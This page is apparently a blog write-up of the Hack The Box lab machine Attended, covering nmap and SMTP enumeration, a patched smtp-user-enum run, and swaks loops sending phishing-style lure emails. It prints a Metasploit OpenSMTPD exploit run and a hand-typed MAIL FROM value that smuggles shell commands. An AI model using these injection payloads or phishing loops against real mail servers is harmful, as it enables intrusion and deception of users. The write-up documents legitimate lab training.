@@ -1,0 +1,1393 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Attended Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the insane-difficulty OpenBSD machine Attended from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the insane-difficulty OpenBSD machine Attended from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/attended/" /><meta property="og:url" content="https://zweilosec.github.io/posts/attended/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/attended-0-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-08T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/attended-0-infocard.png" /><meta property="twitter:title" content="Hack The Box - Attended Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-08T14:00:00+00:00","datePublished":"2021-05-08T14:00:00+00:00","description":"Zweilosec’s writeup on the insane-difficulty OpenBSD machine Attended from https://hackthebox.eu","headline":"Hack The Box - Attended Writeup","image":"https://zweilosec.github.io/assets/img/attended-0-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/attended/"},"url":"https://zweilosec.github.io/posts/attended/"}</script><title>Hack The Box - Attended Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Attended Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Attended Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 8, 2021, 2:00 PM +0000" prep="on" > May 8, 2021 <i class="unloaded">2021-05-08T14:00:00+00:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6568 words">36 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---attended">HTB - Attended</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-0-infocard.png" alt="Descriptive information card about this machine" /></p><p>Short description to include any strange things to be dealt with</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="useful-thing-1">Useful thing 1</h3><p>description with generic example</p><h3 id="useful-thing-2">Useful thing 2</h3><p>https://net2.com/how-to-display-the-contents-of-a-text-file-on-the-terminal-in-linux-ubuntu/</p><p>Using Echo</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">echo</span> “<span class="si">$(</span>&lt;<span class="nv">$file_name</span><span class="si">)</span>”
+</pre></table></code></div></div><p>The parenthesis ( ) are used to return the value of a given expression which in this case, is the contents of file_name .</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.xxx</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ nmap -sCV -p- -n -Pn -vvv -oA attended 10.10.10.221
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 19:03 EDT
+Nmap scan report for 10.10.10.221
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 4f:08:48:10:a2:89:3b:bd:4a:c6:81:03:cb:20:04:f5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCajKy5e0I1LZSVQsHWYnkWWs5/jZznYlMik932jxCLnhiH0XfKhQkeakcn2jDoWyXM+5aUWofoMFM0djPtoPxTZnnmuIwncEXGhGDjQvTSaz8Uaba6IWlmcwbCVi+yE5uSM31iWtcfO3fmwa4W45GMD0LDEUvmM18z8beUNUHmuj69xq1/thXiK8Ekm9NhT8pUySMl6b1v6UChF6xCKydudrTkQ2PtW6to/v3wIWAFdr3kP4EzN018S1dsZsep2AXwGObZJghTrrEryAVkNf/fOxcDQo3obhzFll14xd9VcYYnPh1+x+WamJUaPD07/FOgYUghhSpnwlKSuJYpnnFuAzDE2IXqNtWaLMN1ZrG+TFK2X5hnASTu6o24VvH+AzSf1MlaFB/CS2pXRivH6S37ETj7tb6eZh9sXHnxNc9Wm+PaqoteQyru/tvwQUyKgpjhNL/0HXDAOg466iJu8sLzRirBFjJGx549LNSNAJzLEvhstjSNBirOMFLyNHu1wT0=
+|   256 1a:41:82:21:9f:07:9d:cd:61:97:e7:fe:96:3a:8f:b0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLM+87aXzxrncG0FY76FeBol0aCzuMS24x87hHAR8AuCUOi0kII0hnVcfSXWA6KhmCJEJ9Uh9AJFhRVWCqe9NSw=
+|   256 e0:6e:3d:52:ca:5a:7b:4a:11:cb:94:ef:af:49:07:aa (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMJetBmI2kdgSmPqxFUoM3xm0yeFboNZwDzeGsID4RiD
+25/tcp open  smtp    syn-ack
+| fingerprint-strings: 
+|   GenericLines, GetRequest: 
+|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
+|     5.5.1 Invalid command: Pipelining not supported
+|   Hello: 
+|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
+|     5.5.1 Invalid command: EHLO requires domain name
+|   Help: 
+|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
+|     214- This is OpenSMTPD
+|     214- To report bugs in the implementation, please contact bugs@openbsd.org
+|     214- with full details
+|     2.0.0: End of HELP info
+|   NULL: 
+|_    220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
+| smtp-commands: proudly setup by guly for attended.htb Hello nmap.scanme.org [10.10.14.172], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
+|_ This is OpenSMTPD To report bugs in the implementation, please contact bugs@openbsd.org with full details 2.0.0: End of HELP info 
+Nmap done: 1 IP address (1 host up) scanned in 135.62 seconds
+
+</pre></table></code></div></div><p>This machine only had two ports open, 22- SSH, and 25 - SMTP.</p><h3 id="port-25-smtp">Port 25 SMTP</h3><ul><li>https://www.hackercoolmagazine.com/smtp-enumeration-with-kali-linux-nmap-and-smtp-user-enum/<li>https://www.hackingarticles.in/4-ways-smtp-enumeration/</ul><p>It’s not very often that I have to start right off the bat with some research. I could tell this was going to be a difficult machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ telnet 10.10.10.221 25   
+Trying 10.10.10.221...
+Connected to 10.10.10.221.
+Escape character is '^]'.
+220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
+HELP
+214- This is OpenSMTPD
+214- To report bugs in the implementation, please contact bugs@openbsd.org
+214- with full details
+214 2.0.0: End of HELP info
+VRFY root
+500 5.5.1 Invalid command: Command unrecognized
+VRFY root@attended.htb
+500 5.5.1 Invalid command: Command unrecognized
+</pre></table></code></div></div><p>The command I was used to using for verifying users did not work. I did notice the username <code class="language-plaintext highlighter-rouge">guly</code> in the output, the hostname <code class="language-plaintext highlighter-rouge">attended.htb</code>, and the HELP command reporting that this was an OpenBSD machine. I decided to look up some more information about <code class="language-plaintext highlighter-rouge">OpenSMTPD</code> to see if there were different commands to use.</p><ul><li>https://www.opensmtpd.org/manual.html</ul><p>Unfortunately the man page did not have what I wanted, and nothing that I could find showed that there were different commands for interacting with OpenSMPTD. I decided that the admins probably had just disabled the <code class="language-plaintext highlighter-rouge">VRFY</code> command for security.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>HELO
+501 5.5.1 Invalid command: HELO requires domain name
+HELO attended.htb
+250 proudly setup by guly for attended.htb Hello attended.htb [10.10.14.172], pleased to meet you
+</pre></table></code></div></div><p>I tried connecting again, pretending to be <code class="language-plaintext highlighter-rouge">attended.htb</code> and it didnt care. It seemed that this machine did not have SPF enabled and that I might be able to use it as a relay to send mail.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>MAIL FROM:&lt;root@attended.htb&gt;          
+250 2.0.0: Ok
+RCPT TO:&lt;root@attended.htb&gt;
+250 2.1.5 Destination address valid: Recipient ok
+</pre></table></code></div></div><p>I found a way to find valid email addresses by simply using the <code class="language-plaintext highlighter-rouge">RCPT TO</code> command. My first guess <code class="language-plaintext highlighter-rouge">root@attended.htb</code> was a valid email address.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>MAIL FROM:&lt;root@attended.htb&gt;          
+250 2.0.0: Ok
+RCPT TO:&lt;root@attended.htb&gt;
+250 2.1.5 Destination address valid: Recipient ok
+DATA
+354 Enter mail, end with "." on a line by itself
+Note to self
+click this: 
+http://10.10.14.172:8090/$whoami
+.
+550 5.7.1 Delivery not authorized, message refused: Message is not RFC 2822 compliant
+</pre></table></code></div></div><p>I tried typing out an email by hand, but apparently I had to make the email message RFC 2822 compliant to get it to send. L</p><ul><li>https://tools.ietf.org/html/rfc2822<li>https://its.ny.gov/security-advisory/vulnerability-opensmtpd-could<li>https://nvd.nist.gov/vuln/detail/CVE-2020-8794</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>msf6 exploit(unix/smtp/opensmtpd_mail_from_rce) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.172:8091 
+[*] 10.10.10.221:25 - Executing automatic check (disable AutoCheck to override)
+[!] 10.10.10.221:25 - The service is running, but could not be validated.
+[*] 10.10.10.221:25 - Connecting to OpenSMTPD
+[*] 10.10.10.221:25 - Saying hello and sending exploit
+[*] 10.10.10.221:25 - Expecting: /220.*OpenSMTPD/
+[*] 10.10.10.221:25 - Sending: HELO eaSQOx740fLw0e2kVH
+[*] 10.10.10.221:25 - Expecting: /250.*pleased to meet you/
+[*] 10.10.10.221:25 - Sending: MAIL FROM:&lt;;for H in J 0 x F n Z U g y m a j D a;do read H;done;sh;exit 0;&gt;
+[*] 10.10.10.221:25 - Expecting: /250.*Ok/
+[-] 10.10.10.221:25 - Exploit aborted due to failure: timeout-expired: Pattern not found: /250.*Ok/
+[*] Exploit completed, but no session was created.
+</pre></table></code></div></div><p>While researching how to send an email properly I found out that there was a metasploit module referenced for a vulnerability found in 2020,</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>MAIL FROM:&lt;;for H in J 0 x F n Z U g y m a j D a;do read H;done;sh;exit 0;&gt;
+553 5.1.0: Sender address syntax error
+</pre></table></code></div></div><p>Manual testing showed that it didn’t like the syntax of the sender’s address. That vulnerabilty may have been fixed in this version, or something may have blocked the reply.</p><h3 id="smtp-user-enum">smtp-user-enum</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ smtp-user-enum -M RCPT -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -D attended.htb -t 10.10.10.221
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+Target count ............. 1
+Username count ........... 168
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ attended.htb
+
+######## Scan started at Sun Apr 25 19:50:32 2021 #########
+######## Scan completed at Sun Apr 25 19:50:43 2021 #########
+0 results.
+
+168 queries in 11 seconds (15.3 queries / sec)
+</pre></table></code></div></div><p>I tried using the <code class="language-plaintext highlighter-rouge">smtp-user-enum</code> tool to enumerate valid user accounts on the machine, but it didn’t seem to be working properly.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-1-invalid.png" alt="Wireshark output showing the invalid SMTP commands being sent" /></p><p>I opened up Wireshark to see if I could troubleshoot. I noticed that the server was telling me that the sender address had a syntax error in it, and that the <code class="language-plaintext highlighter-rouge">RCPT TO</code> command wasnt valid because it wasn’t ready to accept that command yet. I noticed that the syntax for the sender and recipt addresses was missing the angle brackets. I wondered if I could fix this.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ file /usr/bin/smtp-user-enum
+/usr/bin/smtp-user-enum: Perl script text executable
+</pre></table></code></div></div><p>I used the <code class="language-plaintext highlighter-rouge">file</code> tool to find out what type of file the tool was. A lot of tools are scripts and not ELF executables, as was the case here.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-2-tool-fix.png" alt="The perl code of the smtp enumeration tool" /></p><p>I found the relevant piece of code and added in the angle brackets around the two email addresses in the RCPT parameter section of code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ ./smtp-enum -M RCPT -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -D attended.htb -t 10.10.10.221
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+Target count ............. 1
+Username count ........... 168
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ attended.htb
+
+######## Scan started at Sun Apr 25 19:55:26 2021 #########
+10.10.10.221: bin@attended.htb exists
+10.10.10.221: daemon@attended.htb exists
+10.10.10.221: nobody@attended.htb exists
+10.10.10.221: operator@attended.htb exists
+10.10.10.221: postmaster@attended.htb exists
+10.10.10.221: root@attended.htb exists
+10.10.10.221: ROOT@attended.htb exists
+10.10.10.221: sshd@attended.htb exists
+10.10.10.221: www@attended.htb exists
+######## Scan completed at Sun Apr 25 19:55:38 2021 #########
+9 results.
+
+168 queries in 12 seconds (14.0 queries / sec)
+</pre></table></code></div></div><p>After I fixed the <code class="language-plaintext highlighter-rouge">smtp-user-enum</code> tool it worked! I used the same wordlist that the <code class="language-plaintext highlighter-rouge">scanner/smtp/smtp_enum</code> metasploit module was supposed to use, and found a short list of usernames to work with. I thought that perhaps I could use this to send a phishing email like I did when doing the Hack the Box machines <a href="https://zweilosec.github.io/posts/sneakymailer/">SneakyMailer</a> or <a href="https://zweilosec.github.io/posts/reel2/">Reel2</a>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ ./smtp-enum -M RCPT -U usertest -D attended.htb -t 10.10.10.221
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... usertest
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ attended.htb
+
+######## Scan started at Sun Apr 25 22:03:47 2021 #########
+10.10.10.221: guly@attended.htb exists
+######## Scan completed at Sun Apr 25 22:03:47 2021 #########
+1 results.
+
+1 queries in 1 seconds (1.0 queries / sec)
+</pre></table></code></div></div><p>Since the username <code class="language-plaintext highlighter-rouge">guly</code> was in the responses I had gotten from SMTP I added it to my tests and made sure it was also a valid email address. I put all of the valid usernames into a file called <code class="language-plaintext highlighter-rouge">users</code>.</p><h3 id="using-swaks-to-send-emails">Using swaks to send emails</h3><ul><li>https://zweilosec.github.io/posts/sneakymailer/<li>https://github.com/jetmore/swaks</ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="k">for </span>address <span class="k">in</span> <span class="si">$(</span><span class="nb">cat users</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span>swaks <span class="nt">--helo</span> attended.htb <span class="se">\</span>
+<span class="nt">--to</span> <span class="nv">$address</span> <span class="nt">--from</span> zweilos@attended.htb <span class="nt">--header</span> <span class="s2">"Subject: Check this out"</span> <span class="se">\</span>
+<span class="nt">--body</span> <span class="s2">"Check this out</span><span class="se">\n</span><span class="s2"> http://10.10.14.172:8090/"</span> <span class="nt">--server</span> 10.10.10.221<span class="p">;</span> <span class="k">done</span>
+</pre></table></code></div></div><p>I used the tool <code class="language-plaintext highlighter-rouge">swaks</code> as I had done in <a href="https://zweilosec.github.io/posts/sneakymailer/">SneakyMailer</a>, sending a link to my machine in a phishing email to see what I could get back.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-3-mail-success.png" alt="Wireshark output showing my phishing emails were successfully sent" /></p><p>After sending my emails, I checked Wireshark again, and saw that my emails were all successfully sent. I watched my waiting netcat listener to see if I would recieve any responses, but nothing came back.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/attended]
+└─<span class="nv">$ </span><span class="k">for </span>address <span class="k">in</span> <span class="si">$(</span><span class="nb">cat users</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span>swaks <span class="nt">--helo</span> attended.htb <span class="se">\ </span>
+<span class="nt">--to</span> <span class="nv">$address</span> <span class="nt">--from</span> root@attended.htb <span class="nt">--header</span> <span class="s2">"Subject: Check this out"</span> <span class="se">\</span>
+<span class="nt">--body</span> <span class="s2">"Check this out</span><span class="se">\n</span><span class="s2">http://10.10.14.172:8090/"</span> <span class="nt">--server</span> 10.10.10.221<span class="p">;</span> <span class="k">done</span>
